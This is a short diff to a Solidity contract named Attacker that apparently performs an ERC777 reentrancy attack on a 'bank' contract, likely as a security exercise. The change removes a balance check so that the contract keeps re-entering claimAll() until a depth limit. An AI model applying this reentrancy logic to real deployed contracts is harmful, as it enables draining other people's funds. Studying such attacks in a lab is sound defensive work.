@@ -40,7 +40,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 			bank.deposit{value: amt}(); //deposit the amt to start the attack
 			emit Deposit(amt);			
 			
-      if((depth < max_depth) & (balances[msg.sender] != 0)){
+      if(depth < max_depth){
         depth ++;
         bank.claimAll();
       }
